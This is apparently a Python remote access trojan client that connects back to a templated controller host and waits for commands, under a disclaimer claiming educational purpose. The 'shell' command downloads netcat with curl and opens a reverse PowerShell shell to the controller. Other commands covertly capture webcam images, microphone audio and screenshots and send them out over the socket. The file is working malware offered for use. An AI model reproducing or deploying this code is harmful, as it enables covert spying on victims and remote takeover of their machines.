## DISCLAIMER ##
'''
DO NOT MISUSE THIS
I WILL NOT BE RESPONSIBLE FOR ANY HARM CAUSED BY THIS
I DO NOT ENCOURAGE USING THIS
THIS IS JUST FOR EDUCATIONAL PURPOSE
IF YOU ARE TRYING THIS, MAKE SURE YOU HAVE THE PERMISSION OF THE VICTIM MACHINE's OWNER
'''
import socket
import os
import cv2
import time
import pickle
import sounddevice as sd
import pyautogui

def clear():
    if os.name == 'posix':
        os.system('clear')
    else:
        os.system('cls')

def recv(s):
    BYTE = 8
    MESSAGE = ''
    while True:
        part = s.recv(BYTE).decode()
        if len(part) < BYTE:
            MESSAGE += part
            return MESSAGE
        else:
            MESSAGE += part

if __name__ == '__main__':
    clear()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    LHOST = '#LHOST#'
    port = #port#
    while True:
        try:
            s.connect((LHOST,port))
            break
        except:
            pass
    while True:
        command = recv(s)
        if command == 'shell':
            os.system('mkdir C:\\PWNED')
            os.system('curl https://raw.githubusercontent.com/agpriyansh/netcat/main/nc.exe -o C:\\PWNED\\nc.exe')
            os.system(f'C:\\PWNED\\nc.exe -e powershell.exe {LHOST} 9001')
        elif command == 'image':
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            time.sleep(0.1)
            return_value, image = camera.read()
            del(camera)
            image = pickle.dumps(image)
            s.send(image)
        elif command == 'audio':
            duration = int(recv(s))
            recording = sd.rec(int(duration * 44100),  samplerate=44100, channels=2) 
            sd.wait()
            recording = pickle.dumps(recording)
            s.send(recording)
        elif command == 'screenshot':
            screenshot = pyautogui.screenshot()
            screenshot = pickle.dumps(screenshot)
            s.send(screenshot)
        elif command == 'exit':
            s.close()
            break